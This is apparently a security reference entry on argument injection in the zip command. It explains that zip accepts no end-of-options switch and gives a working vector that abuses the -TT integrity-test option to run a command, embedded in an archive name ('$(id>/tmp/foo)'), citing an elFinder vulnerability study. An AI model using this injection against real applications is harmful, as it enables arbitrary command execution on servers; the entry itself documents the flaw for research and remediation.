---
description: Most invocations of zip are likely to be vulnerable, as it doesn't support the [end-of-options switch](../../remediation/) before the archive name.
functions:
  command:
    - description: |
        This vector relies on the integrity test feature (`-T`) with an arbitrary
        command (`-TT`). To chain both short names, a dummy option is added (`-m`).
        When injecting during the archive creation process, two positional arguments
        are required: the destination and a file to compress.
      references:
        - title: elFinder - A Case Study of Web File Manager Vulnerabilities
          url: https://www.sonarsource.com/blog/elfinder-case-study-of-web-file-manager-vulnerabilities/
      code: zip '-TmTT="$(id>/tmp/foo)foooo".zip' './a.zip' './a.txt'
---
